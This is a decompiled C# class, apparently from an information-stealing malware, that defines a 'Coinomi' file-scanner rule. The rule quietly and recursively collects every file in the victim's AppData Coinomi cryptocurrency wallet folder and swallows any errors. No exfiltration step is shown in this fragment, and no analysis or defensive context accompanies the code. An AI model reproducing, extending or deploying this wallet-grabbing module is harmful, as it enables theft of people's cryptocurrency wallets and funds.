using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000017 RID: 23
public class CoinomiRule : FileScannerRule
{
	// Token: 0x0600005D RID: 93 RVA: 0x000055F0 File Offset: 0x000037F0
	public CoinomiRule()
	{
		base.Name = "Coinomi";
	}

	// Token: 0x0600005E RID: 94 RVA: 0x00004F07 File Offset: 0x00003107
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x0600005F RID: 95 RVA: 0x00005604 File Offset: 0x00003804
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Coinomi";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
